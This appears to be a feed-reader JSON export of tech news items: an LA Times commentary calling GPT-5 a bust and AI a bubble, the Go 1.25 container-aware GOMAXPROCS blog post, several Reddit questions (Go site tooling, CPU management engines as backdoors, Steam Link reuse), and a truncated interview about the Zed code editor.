href=\"https://en.wikipedia.org/wiki/Abacus\">abacus</a>, but the sliding behavior of the beads would invariably be broken. The wrong beads would slide when clicked and couldn't slide back to their original position. The display number would be completely off and sometimes negative.</p><p><a href=\"https://en.wikipedia.org/wiki/Lava_lamp\">lava lamps</a>. The programs would display shapes that move, but that's all. They would bluntly combine together as they came close, with one blob disappearing and the other immediately increasing in size. The blobs would never separate; some apps had small blobs spontaneously generate out of thin air. The blobs tended to vibrate like nervous Chihuahuas.</p><p>One of the LLMs just drew blob outlines.</p>","contentLength":2927,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvmen8/vibe_coding_experiment_failures/"},{"title":"Most firms see no profit boost from generative AI: MIT","url":"https://thehill.com/policy/technology/5460663-generative-ai-zero-returns-businesses-mit-report/","date":1755713128,"author":"/u/creaturefeature16","guid":234828,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mvme6r/most_firms_see_no_profit_boost_from_generative_ai/"},{"title":"Commentary: Say farewell to the AI bubble, and get ready for the crash","url":"https://www.latimes.com/business/story/2025-08-20/say-farewell-to-the-ai-bubble-and-get-ready-for-the-crash","date":1755712676,"author":"/u/creaturefeature16","guid":235578,"unread":true,"content":"<p>Most people not deeply involved in the artificial intelligence frenzy may not have noticed, but perceptions of AI’s relentless march toward becoming more intelligent than humans, even becoming a threat to humanity, came to a screeching halt Aug. 7.</p><p>That was the day when the most widely followed AI company, OpenAI, released GPT-5, an advanced product that the firm had long promised would put competitors to shame and launch a new revolution in this purportedly revolutionary technology.</p><p>As it happened, GPT-5 was a bust. It turned out to be less user-friendly and in many ways less capable than its predecessors in OpenAI’s arsenal. It made the same sort of risible errors in answering users’ prompts, was no better in math (or even worse), and not at all the advance that OpenAI and its chief executive, Sam Altman, had been talking up.</p><div data-click=\"enhancement\" data-align-center=\"\"><div><blockquote><p>AI companies are really buoying the American economy right now, and it’s looking very bubble-shaped.</p></blockquote><p>— Alex Hanna, co-author, “The AI Con”</p></div></div><p>“The thought was that this growth would be exponential,” says Alex Hanna, a technology critic and co-author (with Emily M. Bender of the University of Washington) of the indispensable new book “<a href=\"https://www.harpercollins.com/products/the-ai-con-emily-m-benderalex-hanna?variant=43065101189154\" target=\"_blank\">The AI Con</a>: How to Fight Big Tech’s Hype and Create the Future We Want.” Instead, Hanna says, “We’re hitting a wall.” </p><p>The consequences go beyond how so many business leaders and ordinary Americans have been led to expect, even fear, the penetration of AI into our lives. Hundreds of billions of dollars have been invested by venture capitalists and major corporations such as Google, Amazon and Microsoft in OpenAI and its multitude of fellow AI labs, even though none of the AI labs has turned a profit. </p><p>Public companies have scurried to announce AI investments or claim AI capabilities for their products in the hope of turbocharging their share prices, much as an earlier generation of businesses promoted themselves as “dot-coms” in the 1990s to look more glittery in investors’ eyes. </p><p>Nvidia, the maker of a high-powered chip powering AI research, plays almost the same role as a stock market leader that Intel Corp., another chip-maker, played in the 1990s — helping to prop up the bull market in equities.</p><p>If the promise of AI turns out to be as much of a mirage as dot-coms did, stock investors may face a painful reckoning.</p><p>The cheerless rollout of GPT-5 could bring the day of reckoning closer. “AI companies are really buoying the American economy right now, and it’s looking very bubble-shaped,” Hanna told me. </p><p>The rollout was so disappointing that it shined a spotlight on the degree that the whole AI industry has been dependent on hype. </p><p>Here’s Altman, speaking just before the unveiling of GPT-5, comparing it with its immediate predecessor, GPT-4o: “GPT-4o maybe it was like talking to a college student,” he said. “With GPT-5 now it’s like talking to an expert — a legitimate PhD-level expert in anything any area you need on demand ... whatever your goals are.” </p><p>Well, not so much. When one user asked it to produce a map of the U.S. with all the states labeled, GPT-5 <a href=\"https://bsky.app/profile/did:plc:qc6xzgctorfsm35w6i3vdebx/post/3lvua4fgc722k\" target=\"_blank\">extruded a fantasyland</a>, including states such as Tonnessee, Mississipo and West Wigina. Another prompted the model for a list of the first 12 presidents, with names and pictures. It only <a href=\"https://bsky.app/profile/did:plc:vqtakzi5bityrtbjj4cfan4l/post/3lvvplusuos2n\" target=\"_blank\">came up with nine</a>, including presidents Gearge Washington, John Quincy Adama and Thomason Jefferson. </p><p>Experienced users of the new version’s predecessor models were appalled, not least by OpenAI’s decision to shut down access to its older versions and force users to rely on the new one. “<a href=\"https://www.reddit.com/r/ChatGPT/comments/1mkd4l3/gpt5_is_horrible/\" target=\"_blank\">GPT5 is horrible</a>,” wrote a user on Reddit. “Short replies that are insufficient, more obnoxious ai stylized talking, less ‘personality’ … and we don’t have the option to just use other models.” (OpenAI quickly relented, reopening access to the older versions.)</p><p>The tech media was also unimpressed. “<a href=\"https://futurism.com/the-byte/openai-huge-problem-gpt-5\" target=\"_blank\">A bit of a dud</a>,” judged the website Futurism and Ars Technica termed the rollout <a href=\"https://arstechnica.com/information-technology/2025/08/the-gpt-5-rollout-has-been-a-big-mess/\" target=\"_blank\">“a big mess.”</a> I asked OpenAI to comment on the dismal public reaction to GPT-5, but didn’t hear back.</p><p>None of this means that the hype machine underpinning most public expectations of AI has taken a breather. Rather, it remains in overdrive. </p><p>A projection of AI’s development over the coming years published by something called the AI Futures Project under the title <a href=\"https://ai-2027.com/\" target=\"_blank\">“AI 2027”</a> states: “We predict that the impact of superhuman AI over the next decade will be enormous, exceeding that of the Industrial Revolution.” </p><p>The rest of the document, mapping a course to late 2027 when an AI agent “finally understands its own cognition,” is so loopily over the top that I wondered whether it wasn’t meant as a parody of excessive AI hype. I asked its creators if that was so, but haven’t received a reply.</p><p>One problem underscored by GPT-5’s underwhelming rollout is that it exploded one of the most cherished principles of the AI world, which is that “scaling up” — endowing the technology with more computing power and more data — would bring the grail of artificial general intelligence, or AGI, ever closer to reality. </p><p>That’s the principle undergirding the AI industry’s vast expenditures on data centers and high-performance chips. The demand for more data and more data-crunching capabilities will require <a href=\"https://www.ft.com/content/7052c560-4f31-4f45-bed0-cbc84453b3ce\" target=\"_blank\">about $3 trillion in capital</a> just by 2028, in the estimation of Morgan Stanley. That would outstrip the capacity of the global credit and derivative securities markets. But if AI won’t scale up, most if not all that money will be wasted.</p><p>As Bender and Hanna point out in their book, AI promoters have kept investors and followers enthralled by relying on a vague public understanding of the term “intelligence.” AI bots seem intelligent, because they’ve achieved the ability to seem coherent in their use of language. But that’s different from cognition. </p><p>“So we’re imagining a mind behind the words,” Hanna says, “and that becomes associated with consciousness or intelligence. But the notion of general intelligence is not really well-defined.” </p><p>Indeed, as long ago as the 1960s, that phenomenon was noticed by Joseph Weizenbaum, the designer of the pioneering chatbot ELIZA, which replicated the responses of a psychotherapist so convincingly that even test subjects who knew they were conversing with a machine thought it displayed emotions and empathy.</p><p>“What I had not realized,” <a href=\"https://www.amazon.com/Computer-Power-Human-Reason-Calculation/dp/0716704633/\" target=\"_blank\">Weizenbaum wrote in 1976</a>, “is that extremely short exposures to a relatively simple computer program could induce powerful delusional thinking in quite normal people.” Weizenbaum warned that the “reckless anthropomorphization of the computer” — that is, treating it as some sort of thinking companion — produced a “simpleminded view of intelligence.” </p><p>That tendency has been exploited by today’s AI promoters. They label the frequent mistakes and fabrications produced by AI bots as “hallucinations,” which suggests that the bots have perceptions that may have gone slightly awry. But the bots “don’t have perceptions,” Bender and Hanna write, “and suggesting that they do is yet more unhelpful anthropomorphization.” </p><p>The general public may finally be cottoning on to the failed promise of AI more generally. Predictions that AI will lead to large-scale job losses in creative and STEM fields (science, technology, engineering and math) might inspire feelings that the whole enterprise was a tech-industry scam from the outset. </p><p>Predictions that AI would yield a burst of increased worker productivity haven’t been fulfilled; in many fields, productivity declines, in part because workers have to be deployed to double-check AI outputs, lest their mistakes or fabrications find their way into mission-critical applications — legal briefs incorporating nonexistent precedents, medical prescriptions with life-threatening ramifications and so on.</p><p>Some economists are dashing cold water on predictions of economic gains more generally. MIT economist Daron Acemoglu, for example, forecast last year that AI would produce <a href=\"https://economics.mit.edu/sites/default/files/2024-05/The%20Simple%20Macroeconomics%20of%20AI.pdf\" target=\"_blank\">an increase of only about 0.5%</a> in U.S. productivity and an increase of about 1% in gross domestic product over the next 10 years, mere fractions of the AI camp’s projections.</p><p>The value of Bender’s and Hanna’s book, and the lesson of GPT-5, is that they remind us that “artificial intelligence” isn’t a scientific term or an engineering term. It’s a marketing term. And that’s true of all the chatter about AI eventually taking over the world.</p><p>“Claims around consciousness and sentience are a tactic to sell you on AI,” Bender and Hanna write. So, too, is the talk about the billions, or trillions, to be made in AI. As with any technology, the profits will go to a small cadre, while the rest of us pay the price ... unless we gain a much clearer perception of what AI is, and more importantly, what it isn’t. </p>","contentLength":8909,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mvm6h1/commentary_say_farewell_to_the_ai_bubble_and_get/"},{"title":"Documentation: The only thing developers hate more than writing it is NOT having it","url":"https://andiku.com/blog/documentation-is-dead-long-live-documentation","date":1755712107,"author":"/u/Ok-Ad7050","guid":234684,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvlwsp/documentation_the_only_thing_developers_hate_more/"},{"title":"Container-aware GOMAXPROCS now based on container CPU limits instead of total machine cores","url":"https://go.dev/blog/container-aware-gomaxprocs","date":1755711649,"author":"/u/adityathebe","guid":234664,"unread":true,"content":"<p>Go 1.25 includes new container-aware  defaults, providing more sensible default behavior for many container workloads, avoiding throttling that can impact tail latency, and improving Go’s out-of-the-box production-readiness.\nIn this post, we will dive into how Go schedules goroutines, how that scheduling interacts with container-level CPU controls, and how Go can perform better with awareness of container CPU controls.</p><p>One of Go’s strengths is its built-in and easy-to-use concurrency via goroutines.\nFrom a semantic perspective, goroutines appear very similar to operating system threads, enabling us to write simple, blocking code.\nOn the other hand, goroutines are more lightweight than operating system threads, making it much cheaper to create and destroy them on the fly.</p><p>While a Go implementation could map each goroutine to a dedicated operating system thread, Go keeps goroutines lightweight with a runtime scheduler that makes threads fungible.\nAny Go-managed thread can run any goroutine, so creating a new goroutine doesn’t require creating a new thread, and waking a goroutine doesn’t necessarily require waking another thread.</p><p>That said, along with a scheduler comes scheduling questions.\nFor example, exactly how many threads should we use to run goroutines?\nIf 1,000 goroutines are runnable, should we schedule them on 1,000 different threads?</p><p>This is where <a href=\"https://go.dev/pkg/runtime#GOMAXPROCS\"></a> comes in.\nSemantically,  tells the Go runtime the “available parallelism” that Go should use.\nIn more concrete terms,  is the maximum number of threads to use for running goroutines at once.</p><p>So, if  and there are 1,000 runnable goroutines, Go will use 8 threads to run 8 goroutines at a time.\nOften, goroutines run for a very short time and then block, at which point Go will switch to running another goroutine on that same thread.\nGo will also preempt goroutines that don’t block on their own, ensuring all goroutines get a chance to run.</p><p>From Go 1.5 through Go 1.24,  defaulted to the total number of CPU cores on the machine.\nNote that in this post, “core” more precisely means “logical CPU.”\nFor example, a machine with 4 physical CPUs with hyperthreading has 8 logical CPUs.</p><p>This typically makes a good default for “available parallelism” because it naturally matches the available parallelism of the hardware.\nThat is, if there are 8 cores and Go runs more than 8 threads at a time, the operating system will have to multiplex these threads onto the 8 cores, much like how Go multiplexes goroutines onto threads.\nThis extra layer of scheduling is not always a problem, but it is unnecessary overhead.</p><p>Another of Go’s core strengths is the convenience of deploying applications via a container, and managing the number of cores Go uses is especially important when deploying an application within a container orchestration platform.\nContainer orchestration platforms like <a href=\"https://kubernetes.io/\" rel=\"noreferrer\" target=\"_blank\">Kubernetes</a> take a set of machine resources and schedule containers within the available resources based on requested resources.\nPacking as many containers as possible within a cluster’s resources requires the platform to be able to predict the resource usage of each scheduled container.\nWe want Go to adhere to the resource utilization constraints that the container orchestration platform sets.</p><p>Let’s explore the effects of the  setting in the context of Kubernetes, as an example.\nPlatforms like Kubernetes provide a mechanism to limit the resources consumed by a container.\nKubernetes has the concept of CPU resource limits, which signal to the underlying operating system how many core resources a specific container or set of containers will be allocated.\nSetting a CPU limit translates to the creation of a Linux <a href=\"https://docs.kernel.org/admin-guide/cgroup-v2.html#cpu\" rel=\"noreferrer\" target=\"_blank\">control group</a> CPU bandwidth limit.</p><p>Before Go 1.25, Go was unaware of CPU limits set by orchestration platforms.\nInstead, it would set  to the number of cores on the machine it was deployed to.\nIf there was a CPU limit in place, the application may try to use far more CPU than allowed by the limit.\nTo prevent an application from exceeding its limit, the Linux kernel will <a href=\"https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/#how-pods-with-resource-limits-are-run\" rel=\"noreferrer\" target=\"_blank\">throttle</a> the application.</p><p>Throttling is a blunt mechanism for restricting containers that would otherwise exceed their CPU limit: it completely pauses application execution for the remainder of the throttling period.\nThe throttling period is typically 100ms, so throttling can cause substantial tail latency impact compared to the softer scheduling multiplexing effects of a lower  setting.\nEven if the application never has much parallelism, tasks performed by the Go runtime—such as garbage collection—can still cause CPU spikes that trigger throttling.</p><p>We want Go to provide efficient and reliable defaults when possible, so in Go 1.25, we have made  take into account its container environment by default.\nIf a Go process is running inside a container with a CPU limit,  will default to the CPU limit if it is less than the core count.</p><p>Container orchestration systems may adjust container CPU limits on the fly, so Go 1.25 will also periodically check the CPU limit and adjust  automatically if it changes.</p><p>Both of these defaults only apply if  is otherwise unspecified.\nSetting the  environment variable or calling  continues to behave as before.\nThe <a href=\"https://go.dev/pkg/runtime#GOMAXPROCS\"></a> documentation covers the details of the new behavior.</p><h2>Slightly different models</h2><p>Both  and a container CPU limit place a limit on the maximum amount of CPU the process can use, but their models are subtly different.</p><p> is a parallelism limit.\nIf  Go will never run more than 8 goroutines at a time.</p><p>By contrast, CPU limits are a throughput limit.\nThat is, they limit the total CPU time used in some period of wall time.\nThe default period is 100ms.\nSo an “8 CPU limit” is actually a limit of 800ms of CPU time every 100ms of wall time.</p><p>This limit could be filled by running 8 threads continuously for the entire 100ms, which is equivalent to .\nOn the other hand, the limit could also be filled by running 16 threads for 50ms each, with each thread being idle or blocked for the other 50ms.</p><p>In other words, a CPU limit doesn’t limit the total number of CPUs the container can run on.\nIt only limits total CPU time.</p><p>Most applications have fairly consistent CPU usage across 100ms periods, so the new  default is a pretty good match to the CPU limit, and certainly better than the total core count!\nHowever, it is worth noting that particularly spiky workloads may see a latency increase from this change due to  preventing short-lived spikes of additional threads beyond the CPU limit average.</p><p>In addition, since CPU limits are a throughput limit, they can have a fractional component (e.g., 2.5 CPU).\nOn the other hand,  must be a positive integer.\nThus, Go must round the limit to a valid  value.\nGo always rounds up to enable use of the full CPU limit.</p><p>Go’s new  default is based on the container’s CPU limit, but container orchestration systems also provide a “CPU request” control.\nWhile the CPU limit specifies the maximum CPU a container may use, the CPU request specifies the minimum CPU guaranteed to be available to the container at all times.</p><p>It is common to create containers with a CPU request but no CPU limit, as this allows containers to utilize machine CPU resources beyond the CPU request that would otherwise be idle due to lack of load from other containers.\nUnfortunately, this means that Go cannot set  based on the CPU request, which would prevent utilization of additional idle resources.</p><p>Containers with a CPU request are still <a href=\"https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/#how-pods-with-resource-limits-are-run\" rel=\"noreferrer\" target=\"_blank\">constrained</a> when exceeding their request if the machine is busy.\nThe weight-based constraint of exceeding requests is “softer” than the hard period-based throttling of CPU limits, but CPU spikes from high  can still have an adverse impact on application behavior.</p><h2>Should I set a CPU limit?</h2><p>We have learned about the problems caused by having  too high, and that setting a container CPU limit allows Go to automatically set an appropriate , so an obvious next step is to wonder whether all containers should set a CPU limit.</p><p>While that may be good advice to automatically get a reasonable  defaults, there are many other factors to consider when deciding whether to set a CPU limit, such as prioritizing utilization of idle resources by avoiding limits vs prioritizing predictable latency by setting limits.</p><p>The worst behaviors from a mismatch between  and effective CPU limits occur when  is significantly higher than the effective CPU limit.\nFor example, a small container receiving 2 CPUs running on a 128 core machine.\nThese are the cases where it is most valuable to consider setting an explicit CPU limit, or, alternatively, explicitly setting .</p><p>Go 1.25 provides more sensible default behavior for many container workloads by setting  based on container CPU limits.\nDoing so avoids throttling that can impact tail latency, improves efficiency, and generally tries to ensure Go is production-ready out-of-the-box.\nYou can get the new defaults simply by setting the Go version to 1.25.0 or higher in your .</p><p>Thanks to everyone in the community that contributed to the <a href=\"https://go.dev/issue/33803\">long</a><a href=\"https://go.dev/issue/73193\">discussions</a> that made this a reality, and in particular to feedback from the maintainers of <a href=\"https://pkg.go.dev/go.uber.org/automaxprocs\" rel=\"noreferrer\" target=\"_blank\"></a> from Uber, which has long provided similar behavior to its users.</p>","contentLength":9210,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1mvlow9/containeraware_gomaxprocs_now_based_on_container/"},{"title":"Maven-like Site for Golang?","url":"https://www.reddit.com/r/golang/comments/1mvlf78/mavenlike_site_for_golang/","date":1755711078,"author":"/u/Hitkilla","guid":235580,"unread":true,"content":"<p>Hello! I come from the Java world where we used maven and it would generate static sites during build. These sites would be archived with the jar so that we have a historical record of information such as dependency tree, test results, etc. </p><p>I’m still new to Golang and I want to know if there is any tool that can generate a static html or something that can aggregate data about the go project and create a searchable site similar to a maven site. </p><p>I’m aware that Golang has dependency tree and test run commands. Would the recommended method be to stitch together the output from various GO commands into a site? </p>","contentLength":618,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Even If You Use Linux, the NSA Could Track You Hidden CPU Backdoors True ?","url":"https://www.reddit.com/r/linux/comments/1mvk0vq/even_if_you_use_linux_the_nsa_could_track_you/","date":1755708083,"author":"/u/underbillion","guid":235734,"unread":true,"content":"<p>[ Check Images below in comments first ]</p><p>Modern CPUs have parts we don’t fully understand. Intel’s ME and AMD’s PSP run tiny OSes with full control over the CPU, invisible to Windows or Linux. They were designed for legitimate tasks, but could be exploited as backdoors. Intel ME has had security issues before, and while AMD PSP is harder to attack, it’s deeply connected to the CPU. Most users aren’t at risk, but these systems could be used by a skilled actor without the OS ever knowing.</p><p>If the NSA wanted to exploit this as a backdoor, they could Linux or any other OS wouldn’t stop it. Even a single vulnerability could be enough for someone to gain full access.</p>","contentLength":678,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Anyone done anything with old Steam Link hardware?","url":"https://www.reddit.com/r/linux/comments/1mvjzm0/anyone_done_anything_with_old_steam_link_hardware/","date":1755708005,"author":"/u/QuirkyImage","guid":235702,"unread":true,"content":"<div><p>Just wondered if anyone has done anything with the old Steam Link hardware? I found one in a box unopened from when they had the deal with the controller for 9 quid. Wonder if I could put Linux on it and use it as a thin client or low power server for something or any other uses.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/QuirkyImage\"> /u/QuirkyImage </a>","contentLength":314,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Talking To Zed Industries- Makers Of The 100% Rust, Super-Performant, Collaborative Code Editor","url":"https://filtra.io/rust/interviews/zed-aug-25","date":1755706394,"author":"/u/anonymous_pro_","guid":234702,"unread":true,"content":"<p>I think a lot of people in the Rust community will know that Zed is a new code editor written in Rust. We're all super excited about it. So, I wanted to start with a question that I think might feel overly confrontational, but I just wanted to phrase it this way because I think it might get an interesting answer. The question is, why do we need a new editor?</p><p>That's an excellent question. For one, I think we need a new code editor because of live collaboration. This was the reason I joined Zed in the first place. Developer tooling has been built with certain expectations and certain models for a very long time. But, in order to get the sort of live collaborative experience that you see from something like Figma or Google Docs, you have to bake-in the right data structures and processes from the get-go. You need to build your entire code editor on those data structures and concepts in order to get them to work. In a lot of other tools I've found that you can feel a little bit of a mismatch between the CRDTs (Conflict-free Replicated Data Type) and the other data structures over here and then the fundamental code and the actual data structure that renders on your screen, which might be over there. So, that's the collaborative angle.</p><p>Another reason is just that technology changes and time marches on. Electron is a really impressive piece of technology that solved a really hard problem. It’s now been quite a while since that problem was solved, and we have new tools and new possibilities, specifically Rust. We believe that Rust makes it possible to have the same level of ergonomics and support without the 200 megabytes of embedded V8 that every desktop app is carrying around nowadays.</p><p>When I was doing some research I found a statement from someone at Zed talking about how the editor is built like a video game. Does that play into what you were saying about live collaboration and stuff?</p><p>Yes, fundamentally those CRDTs and the underlying tech for synchronizing have a cost. You need to track a little bit more data because you're doing a more complicated problem. Also, specifically with code editors, the bounds on the problem in terms of resource utilization, like memory and file handles and all that sort of stuff isn't under your control. For example, if you ask us to open a hundred files, our job is to open a hundred files or die trying. So, we're kind of stuck in this little triangle where we have to do something that is a little more expensive than it would be otherwise because of the live collaboration features. And, the amount of work we have to do is not under our control. So, we have to make sure that what little we add on top of that is as small as we can make it. And on top of that, we want to make a fast, nice app. We live in this all day long.</p><p>To solve those trade-offs, the founders really had to go back to the beginning and be like, \"Okay, there's all this Electron, there's all this JavaScript, there's all this stuff. Let's just toss that aside. Let's make this as small as possible and then build up from there.\" For example, we've been continually improving GPUI. But, we don't want to have to lug around all of the weight of the way editors have been built and tackle these new problems. We want to simplify. And, if that means we have to do more work or we have to build it like a video game or use tools from other realms of software, then that's what we do to solve this problem.</p><p>One of the other things I saw when I was doing research is that the founding team of Zed has a crazy amount of experience to lead them to this moment in their careers. Can you speak to that a little bit?</p><p>Zed is a special project at a special time, because it's one of those things where all the stars aligned over multiple decades to make this thing possible. Nathan (the CEO) led the Atom team at GitHub. He was core to that whole thing. That project of course led to the creation of Electron and the current state of desktop app development.</p><p>Nathan and Max both also worked at Pivotal Labs before being on the Atom team. They did a lot of pair programming together there, and that has carried into our culture today. Also, Max worked on Tree-sitter, which is one of the core components of almost every syntax highlighting or code parsing tool made in the last 7 years. Antonio also entered the mix when they were working on Atom. If I remember the story correctly, he just started submitting really good PRs for Atom, so Nathan brought him in and they became good friends. But the key here is that all three of these guys live in different places. Antonio is in Italy. He's Italian. Nathan is in Boulder, CO. Max is in Oregon. I think the fact that they live far apart contributed to a lot of their initial research into CRDTs. I believe one of the early live collaboration tools for developers was actually an Atom plugin called Teletype, also by the GitHub Atom team.</p><p>That's awesome! Who you're working for makes a big difference, and that must be such an awesome thing to be working with a really specifically experienced team like that.</p><p>Yeah. And, it's hard to overstate how important collaboration is to Zed. I think one of the reasons we function so well as a company is because we are collaborating and pair programming every day. Though, it’s not quite pair programming. I call it parallel programming. We're sharing context, figuring things out, and understanding the problem together. If you look at our GitHub repository you don't often see very many code reviews, but you will see multiple heads on every commit. That's because we're spending all day together, understanding the problem together.</p><p>So, are you personally in the collaborative feature of Zed for a large part of your day?</p><p>Yes! I am almost always pairing with somebody. We always try to make sure we can pair. Even if it's like European evening and American morning we will pair for an hour or two to talk about the problem and then go off and do it separately. So, most programming is done together. That said, there are a lot of things that aren't programming, such as reviewing PRs from external people, that might be done a little more solo.</p><p>I feel like when I've done a lot of pair programming, it just makes the emotional load of taking on something that feels hard so much easier.</p><p>Yeah, you feel like you’re in it together! You also usually have a slightly different perspective or slightly different skills that can complement each other. I will say, what we do is not classical pair programming. For a long time, pair programming has been two people sitting at one keyboard. One of the key things about collaboration in Zed and other tools is that you're in your code editor, with your theme, your settings, and so on. You just happen to be visiting their file system and utilizing their language server and stuff like that. So, it's actually a lot more comfortable and a lot more like bouncing off each other. I'll often be like, \"Okay, let's split up. I'll implement this part. You implement that part.\" It's a good flow.</p><p>So, speaking of taking on hard things, to me building a code editor from scratch seems really hard. Everything that you explained in terms of the reasons why you would want to build a new editor makes total sense. However, there's all these other people building new editors. And, most of them are forking VS Code because they're getting a bunch of stuff for free by doing that. How do you guys think about prioritizing what to build? There's all of this stuff that you have to add to the product just to catch up to the level of features that people expect.</p><p>That is the question at Zed. It’s the question we spend most days thinking about in one way or another. It's both a blessing and a curse of working on a code editor because there are so many things we have to do. This has meant that oftentimes our decisions are driven by what we're interested in. That was especially true when we were starting out. It's not really the case as much these days. But, when we were starting out, whatever you wanted to get done got done because everything had to get done. So, when you don't have fold indicators or indent guides and you have a little idea of how to do fold indicators, you do fold indicators instead of indent guides. These days it's a little bit different because we have done a lot of that low-hanging fruit. We are still working on how we make decisions for all the stuff that isn't like a big headline project. It's easy to talk about Windows or the agent panel or the debugger. These are very clear things. We can put them on a list, and we can figure out the order we want to do them in. But, where do you put “the debugger doesn't work on my Python project that uses distributed venvs” or whatever the little thing is?</p><p>I guess this is a good time to talk about our approach to AI. When the ChatGPT demo came out, Nathan immediately started reading the white papers about how it worked. We all started experimenting with AI and learning about it. You know, some of what we do is interest-driven development. Nathan got really excited about AI, and people in the community were really excited about it too. So, there was just this massive pressure to do something about it. We initially took an approach with AI that I think was very sound. It was all about controlling the context. So, you could control everything, even the system prompt. It was all there. It was a very, very thin wrapper around the LLM APIs. It seemed great, but people didn't like it that much. Then, the agentic stuff came out and agents became the de facto way. Part of it was us being like, \"Okay, this is all happening. We also need to keep up. There's a moment right now of people switching editors. We need to make sure we are an option for them to switch to.\"</p><p>So, how do we choose what to build at Zed? There's a little bit of strategy to it like \"Hey, right now is a great time to do an agent. Let's make sure we have an agent out really soon.\" There's a little bit of personal desire. Something that's really important to us is that we are making our dream code editor. If there's a dream feature you want, you put it in there. So, there are a few different forces at play.</p><p>You mentioned that you're building your dream editor. That's a very cool thing about the opportunity to work on Zed. It's very rare that you get to work on something where you are also the user.</p><p>Yes. All of your friends are users too. For a while there, I was doing dad-driven development where every few months I would go visit my dad and show him Zed because he's a software developer as well. He'd look at it and be like, \"Oh, there's a problem here. Oh, you can't adjust the panes of the window or whatever,\" and then I would spend all of the next week making resizable panes and stuff like that. It's fun to be able to do that for myself and for the people in my life.</p><p>I think dad-driven development is great. So, I see interesting new feature releases and things from you guys all the time. I wanted to give you the chance to call out any exciting highlights, whether it's business-wise or product-wise. Any exciting milestones that you've hit recently?</p><p>In the last few months, we've actually released a ton of features. It's been a pretty crazy go, go, go time at Zed. We launched the agent panel a couple months ago. We also launched an integrated Git client, which turns out to be something a lot of people really like. We kept getting the feedback that people wanted integrated git. Being a lot of people from GitHub, Zed is full of Git CLI power users. So, we were surprised by that one. We also just launched a debugger. There's been a lot of feature releases lately that have really tipped Zed from being a work in progress to being close to general purpose. I think the most exciting development that I can talk about though is Windows. We are now properly staffed and committed and driving forward on Windows. There are some core technical things we're working on because the Windows platform is so different from macOS and Linux. I don't know if you've seen it, but we have this cute “Windows is coming” sort of website (linked below) that does a Windows 95 experience. Our Head of Marketing vibe-coded the whole thing in Opus. So, Windows is happening. Windows is coming. I promise.</p><p>One of the things a lot of people talk about with Rust is the cross-platform capabilities that it brings. Has it been relatively easy or relatively hard to target the different systems?</p><p>We made the problem harder than it would be for a lot of other projects in the space. Zed likes to build its own tools. We like to make them narrow and sharp for exactly what we're looking for. Also, the project that would become Zed was started back in 2018 before a lot of the Rust ecosystem was fully matured. So, it turns out there's a lot of little things that Zed specifically as a UI application runs into. For us, the big reason that Zed isn't cross-platform is because we are an integrated development environment, meaning that Zed needs to talk to your window, your GPU, in fact it needs to talk to every GPU you can plug into with every Windows and Linux distribution. Or, ideally it would. Obviously, it doesn’t work perfectly with everything, but we try to cover as much as possible, especially for recent tech.</p><p>On top of that, there's a lot of platform-specific things you want to do in a code editor like opening a URL or minimizing and maximizing the window. Because we've built gpui from scratch, we have to go to each of the platforms and figure out how to do it. There is code that we could have used, but we wanted to just go a little simpler than what’s out there. 2D UI is complicated, but it doesn't need the same things as a 3D scene in a video game. So, we're building all this ourselves and we don't use Winit or WGPU or any of these other things that have different goals. So, that all makes things more complicated. We haven't had any problem with Rust specifically. As you know, Rust is fantastic for all of this. The big problem has just been learning things like which random Objective-C function you have to call to make the window transparent on macOS.</p><p>Right. It's all the platform-specific APIs that you have to figure out how to use. That makes sense.</p><p>The one we've had the biggest struggle with is definitely talking to your GPU because GPU drivers have a lot of random problems and people are supposed to keep their drivers up to date. Obviously, we targeted MacOS first, which has actually been very nice as a first target. Apple is so tightly integrated that we don't have problems with GPUs nearly as often. We had it a little bit in the beginning for different displays and stuff like that. But, at this point, Apple has just solved the problem for us. We have to take on more complexity for the other platforms.</p><p>You also mentioned the launch of the Agent Panel. I don't want to just breeze by that because obviously we have this huge agentic editing war going on right now. It's pretty crazy out there! I guess I just wanted to ask or give you an opportunity to point out what you think is different about the Zed approach.</p><p>I think the fundamental problem with LLMs and the LLM integrations we're seeing everywhere is that there's no one to hold responsible. Responsibility is a really key part for how human society works. When something bad happens, you go talk to the person who is responsible for it. You can't do that with LLMs. LLMs can never “hold the bag”. They're not people. So, no matter how powerful and how crazy inventive and amazing these LLMs get, somebody's got to put their reputation on the line. That somebody is going to be a human until the AI labs figure out a fundamental change. Someone's going to have to hold the bag. And when you're holding the bag, you want to make sure that the code you're putting out into the world is working. To do that, you probably want to run some analyses on the code. That might be something as simple as compiling it, doing searches on it, or seeing what the language server has to say about it. All of those things are where we come in. We're here to make that the best experience possible. So, that's how I personally think about code editors and agents out into the future.</p><p>Nowadays it seems like everybody's building their own CLI agent. I think some of this is just things concentrating up into the big AI companies like OpenAI or Anthropic. That makes some sense, because I think they understand LLMs the best and can write the best prompts. They understand how the whole thing works from top to bottom. I think the reason terminals specifically have gotten so big is because they're easy to make UI for, they're low stress, and they already automatically integrate into everybody's existing tools. </p><p>In terms of our agent panel, I think terminals don't make great UI. So, I think there's a lot of room for us to coordinate with the big AI labs and use their knowledge of prompting and how these models work. But, I think over time we're going to see more negotiation around who is owning which part of the process. People like GUIs and left the terminal for a reason, so I think it’s unlikely they’ll go back to it in a big way. We'll see what happens.</p><p>It will be interesting. So, what are the more interesting things you've gotten to work on in your time at Zed?</p><p>The thing I find the most interesting personally is gpui, our UI framework. I am personally invested in making it general use because it is already very general purpose. Anybody can use it. But, there are a lot of things missing that would make it straightforward to use. For example, we don't ship an input component because we built all that as part of our editor. The UI framework gives you the tools to make one, but we don't ship one. So, I think the thing I find most interesting is taking this custom tool that no one else knows how to use and learning how to make it sing. There's been a long history of 